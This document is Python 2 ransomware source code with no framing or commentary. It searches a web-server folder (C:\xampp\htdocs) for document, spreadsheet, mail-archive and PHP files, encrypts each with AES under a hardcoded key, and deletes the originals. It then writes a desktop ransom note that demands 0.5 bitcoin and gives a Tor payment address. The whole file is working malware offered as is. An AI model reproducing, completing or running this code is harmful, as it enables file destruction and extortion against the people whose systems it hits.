#!/usr/bin/python
import os, fnmatch, random, struct, string
from Crypto.Cipher import AES

key = '0123456789abcdef'
identifier = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))

def find_files(root_dir):
	extentions = ['*.doc', '*.docx', '*.xls', '*.pst', '*.php']
	for dirpath, dirs, files in os.walk(root_dir):
		if 'Windows' not in dirpath:
			for basename in files:
				for ext in extentions:
					if fnmatch.fnmatch(basename, ext):
						filename = os.path.join(dirpath, basename)
						yield filename

def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
    """ Encrypts a file using AES (CBC mode) with the
        given key.

        key:
            The encryption key - a string that must be
            either 16, 24 or 32 bytes long. Longer keys
            are more secure.

        in_filename:
            Name of the input file

        out_filename:
            If None, '<in_filename>.enc' will be used.

        chunksize:
            Sets the size of the chunk which the function
            uses to read and encrypt the file. Larger chunk
            sizes can be faster for some files and machines.
            chunksize must be divisible by 16.
    """
    if not out_filename:
        out_filename = in_filename + '.enc'

    iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))

def write_to_file(key):
    userhome = os.path.expanduser('~')
    desktop = userhome + '\Desktop\\'
    files = open(desktop+'ENCRYPTED_FILES.txt', 'w')
    files.write("#####################################################\n\nAll files with extentions: .php , .doc , .docx , .xls , .pst - have been encrypted via AES Encryption\n\nYou have two options, you can either:\n a) Pay the ransom fee of 0.5 btcs - b) Recover your files from a backup.\n\nPlease visit: http://auwrtb6vf2yw3t5drc.onion to decrypt your files.\n - To access this website you will need to use the TOR Browser\nhttps://www.torproject.org/projects/torbrowser.html.en\n\n Identification Key: "+key)

for filename in find_files('C:\\xampp\\htdocs\\'):
    print 'Found Source:', filename
    encrypt_file(key, filename)
    os.remove(filename)

write_to_file(identifier)
